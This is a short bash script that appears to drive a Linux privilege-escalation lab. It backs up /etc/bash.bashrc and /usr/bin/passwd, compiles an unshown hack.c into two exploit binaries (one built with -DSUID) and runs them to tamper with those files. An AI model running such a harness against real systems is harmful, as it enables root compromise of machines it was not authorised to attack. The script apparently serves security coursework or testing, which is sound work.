#!/bin/bash

#back up first
echo 'Backing up bashrc and passwd'
cp '/etc/bash.bashrc' 'bashrc_backup'
cp '/usr/bin/passwd' 'passwd_backup'
cp '/usr/bin/passwd' '/tmp/bak'

#Complie the code
echo 'Compliling Attack Code'
gcc hack.c -o hack_bashrc -lpthread
gcc hack.c -o hack_passwd -lpthread -DSUID

#Run the code
echo 'Hacking Linux'
./hack_bashrc
echo 'Hacking Linux'
./hack_passwd

#Show the success
echo 'Result'
ls -s /success
